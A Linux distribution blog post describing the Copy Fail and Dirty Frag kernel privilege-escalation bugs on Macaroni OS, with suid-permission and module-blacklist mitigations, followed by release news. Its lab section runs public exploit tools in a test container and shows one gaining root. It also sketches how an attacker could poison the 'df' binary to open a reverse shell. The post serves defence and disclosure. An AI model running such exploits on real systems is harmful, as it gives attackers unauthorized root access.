---
author: "Daniele Rondina"
date: 2026-05-17
linktitle: Copy Fail and Dirty Frag
title: Copy Fail and Dirty Frag on Macaroni OS
menu:
  main:
tags:
  - mark
  - macaroni
  - security
weight: 5
---

A little detail about recent security issues in the Linux world
and their impact on the Macaroni OS ecosystem.

# Copy Fail on Macaroni OS

Recently, several important CVEs (CVE-2026-31431, CVE-2026-43500, etc.)
have shaken the Linux world.
We are talking about *Copy Fail*, *Dirty Frag*, and related exploits.

We are surprised that an important mitigation strategy is not yet
been shared and we want instead share what is been analyzed by the Macaroni OS
Team.
This strategy does not fully resolve the security issue, but it at least
gives OS administrators more time to organize a structured upgrade process.

So, this article wants share what is been discovery in order to be usable
not only in Macaroni OS but in all distros where possible.

We were hesitant about sharing this information because publishing it also
means giving attackers additional ideas. However, we believe this is something
important that should be shared, especially considering that fixes for these
security issues are now available.

The security issues related to the *Copy Fail* exploit rely on a Linux kernel
page-cache bug that permits privilege escalation when *suid* files are readable.

Before going into the details,  we want to share a real example performed in the
`macaroni/mark-unstable` LXD/Incus container using the Golang [copyfail-go](https://github.com/badsectorlabs/copyfail-go)
tool now available in our `forensics-kit`, to demonstrate both the exploit
and the mitigation.

So, the first step is to create the testing container:

```bash
$> incus launch -p default macaroni:macaroni/mark-unstable test-cve

$> incus exec test-cve bash

test-cve / $ ego sync

test-cve / $ anise repo update

test-cve / $ anise i go entities
🚀 Luet 0.41.1-geaaru-gc4815024d03bc88794c76a165ba4018ae07296a3 2026-02-21 08:31:25 UTC - go1.25.7
🏠 Repository:              geaaru-repo-index Revision:   15 - 2025-01-04 18:10:44 +0000 -00
🏠 Repository:               macaroni-commons Revision:  281 - 2025-09-20 16:58:24 +0000 -00
🏠 Repository:              macaroni-terragon Revision:  716 - 2026-02-28 08:38:26 +0000 -00
🏠 Repository:                           mark Revision:  118 - 2026-05-12 18:01:03 +0000 -00
🧠 Solving install tree...
🍦 [  1 of   2] [N] app-admin/entities::mark                                      - 0.9.3+5
🍦 [  2 of   2] [N] dev-lang/go::macaroni-terragon                                - 1.25.7
💂 Checking for file conflicts...
✔️  No conflicts found (executed in 31259 µs).
Do you want to continue with this operation? [y/N]: y
🚚 Downloading 2 packages...
📦 [  1 of   2] app-admin/entities::mark                                          - 0.9.3+5         # downloaded ✔ 
📦 [  2 of   2] dev-lang/go::macaroni-terragon                                    - 1.25.7          # downloaded ✔                              
🧠 Sorting 2 packages operations...
🍻 Executing 2 packages operations...
🍰 [  1 of   2] app-admin/entities::mark                                          - 0.9.3+5         # installed ✔ 
[/usr/lib/go/test/fixedbugs/issue27836.dir/Þfoo.go] Ignoring xattr path not supported by the underlying filesystem: operation not supported
[/usr/lib/go/test/fixedbugs/issue27836.dir/Þmain.go] Ignoring xattr path not supported by the underlying filesystem: operation not supported
🍰 [  2 of   2] dev-lang/go::macaroni-terragon                                    - 1.25.7          # installed ✔ 
🎊 All done.

test-cve / $ emerge openssh copyfail-go --nodeps -j

test-cve / $ useradd -s /bin/bash -m geaaru -g users

test-cve / $ entities list users --filter geaaru
+----------+--------------------+---------+----------+------+--------------+-----------+
| USERNAME | ENCRYPTED PASSWORD | USER ID | GROUP ID | INFO |   HOMEDIR    |   SHELL   |
+----------+--------------------+---------+----------+------+--------------+-----------+
| geaaru   | x                  |    1000 |      100 |      | /home/geaaru | /bin/bash |
+----------+--------------------+---------+----------+------+--------------+-----------+

test-cve / $ /etc/init.d/sshd start
 * Caching service dependencies ...                                                                                                        [ ok ]
ssh-keygen: generating new host keys: RSA ECDSA ED25519 
 * Starting sshd ...

test-cve / $ passwd geaaru
```

The `copyfail-go` tool can be downloaded from the website, compiled locally,
or installed directly inside the container through `emerge`.
We use an SSH connection with an unprivileged user named *geaaru* to test
the exploit.

This is what happens in the container:

```bash
# The container has ip 172.18.10.54
$> ssh geaaru@172.18.10.54
(geaaru@172.18.10.54) Password:

geaaru@test-cve ~ $  copyfail-go --backup /tmp/su-original
2026/05/17 08:10:30 Backup failed: open /bin/su: open /bin/su: permission denied

```

The exploit does not work because, by default, the `/bin/su` binary has permissions
set to 4711, while many distributions install it with 4755.

Here is the demonstration: as root (through `incus exec`, for example),
we change the permissions of the `/bin/su` binary to 4755:

```bash
test-cve ~ $ ls -l /bin/su
-rws--x--x 1 root root 45496 Mar 15 19:05 /bin/su
test-cve ~ $ chmod a+r /bin/su
test-cve ~ $
```

and again we try the exploit:

```bash
geaaru@test-cve ~ $ whoami
geaaru
geaaru@test-cve ~ $  copyfail-go --backup /tmp/su-original
2026/05/17 08:10:52 Backed up /bin/su to /tmp/su-original
2026/05/17 08:10:52 Overwriting page cache of /bin/su with 158 bytes
2026/05/17 08:10:52   ... wrote 4 bytes
2026/05/17 08:10:52   ... wrote 104 bytes
2026/05/17 08:10:52   ... wrote 158 bytes
2026/05/17 08:10:52 Executing payload
root@test-cve /home/geaaru $
root@test-cve /home/geaaru $ whoami
root

```

💥 the exploit works and the user obtains root privileges!

Any setuid-root binary readable by the user is vulnerable, so the mitigation
needs to be applied to all such binaries.

This is an example of a simple script that can also be used on non-Macaroni OS
systems to mitigate the security issue:

```
for bin in passwd chsh chfn mount sudo pkexec; do
  path=$(readlink -f "$(which $bin 2>/dev/null)")
  [ -n "$path" ] && echo "fix $path" && chmod 4711 "$path"
done
```

In conclusion, for `copy-fail`, setting permission 4711 on all suid-root
binaries mitigates the exploit.

# Dirty frag on Macaroni OS

Following the page-cache write issue described for the *Copy Fail* exploit,
there is another security issue that permits privilege escalation: *Dirty Frag*.

Using the same container created earlier, this is what happens
inside our MARK container:

```bash
geaaru@test-cve ~ $ git clone https://github.com/V4bel/dirtyfrag.git
Cloning into 'dirtyfrag'...
remote: Enumerating objects: 64, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 64 (delta 18), reused 20 (delta 14), pack-reused 27 (from 1)
Receiving objects: 100% (64/64), 5.83 MiB | 25.29 MiB/s, done.
Resolving deltas: 100% (23/23), done.

geaaru@test-cve ~ $ cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil

geaaru@test-cve ~/dirtyfrag $ ./exp
dirtyfrag: failed (rc=0)
```

Before describing the reason, we suggest applying the mitigation process
already described online:

```bash
$> sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; true"
```

My special thanks to our developer `cuantar` for the precise description
and analysis of the exploit, which I report below.


In the test program there are two exploits:

1) It attempts to poison the page-cache version of *su* so that it starts a root shell,
   by exploiting the suid-root binary.
   This fails on Macaroni because our suid-root binaries are not world-readable.

2) It attempts to poison the page-cache version of `/etc/passwd` in order to rewrite
   the root entry so that root no longer has a shadow password, leaving the password blank.
   This fails on Macaroni because our root entry is not at the top of the file,
   and the GECOS field does not simply contain `root`, as the test program assumes.

   The `/etc/passwd` file is generated by the `entities` tool and the root user
   is created later during the `markdev-kit metro` process.

   Additionally, since we automatically enforce the `wheel` group for `su`
   through our PAM configuration, this is another reason why modifying
   `/etc/passwd` does not work on Macaroni.

   Even if an attacker succeeds in setting the root password to blank,
   they still cannot use the regular unmodified `su` command to switch to root
   unless they belong to the `wheel` group.

   However, we are still vulnerable to attacks against different binaries,
   such as `df`.

It is important to understand that point 2 is still a problem on Macaroni.
A skilled attacker with local access could tailor the exploit specifically
for the target system instead of relying on hard-coded incorrect strings.

Although point 1 fails on Macaroni when attempting to obtain root directly,
an attacker could still use the same technique to modify another binary,
such as `df`, and wait for an administrator to execute it as root.

The exploit allows the attacker to replace the cached version of a binary
with a malicious one by overwriting its beginning with another ELF executable.

For example, instead of spawning a shell directly, the malicious executable
could start a child process that establishes an outgoing connection to a
server controlled by the attacker, attaches it to a shell, and then detaches
the child process.

When the administrator later logs in as root and executes `df`,
a backdoor connection would be created.

Therefore, we are still vulnerable to points 1 and 2 in the hands of a skilled attacker,
but we currently have a reasonable temporary mitigation until updated kernels
are deployed.

Again, my special thanks to `cuantar` and `coffnix` for monitoring security
vulnerabilities and sharing technical details.

We hope this information will help other distributions and OS administrators
in their work.

# Phoenix - WIP

We are sorry for this long waiting in the new release of Phoenix but we have really tons of upgraded
related to the continue improves done in MARK that requires a lot of testing and fix before been released.

Between the upgrades these some important new features incoming:

    - QT 6.10
    - Gnome 48/49 (an hybrid release that works yet with OpenRC)
    - LXQT 2.3.3
    - KDE 6.22.0

Stay tuned!

Enjoy!


# Thanks

Many thanks to all Developers and Contributors that are the sap of all this and to all
people that helps us with testing and donations.

A [Became a Contributor]({{< relref "/docs/mark/contributors" >}}) section is available in our
website and we hope to have a lot of contributors soon.

<div style="text-align: center; margin-bottom: 20px">

<img src="../../images/macaroni_wait4you.png" width="300">

</div>

We waiting for you in our [Discord Server](https://discord.gg/AMuVCRZEvG)!




# Support Us

Any user that wants to support our work for Macaroni could do this through the
Github [Sponsor](https://github.com/sponsors/geaaru) or through the
[Liberay](https://liberapay.com/geaaru/) page.
